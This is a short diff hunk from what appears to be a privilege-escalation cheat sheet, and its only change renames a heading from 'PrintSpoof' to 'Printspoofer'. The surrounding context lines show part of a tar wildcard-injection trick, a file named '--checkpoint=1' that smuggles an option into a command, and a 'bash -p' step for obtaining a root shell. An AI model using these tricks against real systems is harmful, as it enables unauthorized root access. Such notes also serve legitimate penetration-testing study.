@@ -360,7 +360,7 @@ echo "" > --checkpoint=1
 "/bin/bash -p" -grab root
 ```
 
-# PrintSpoof
+# Printspoofer
 
 ```powershell
 
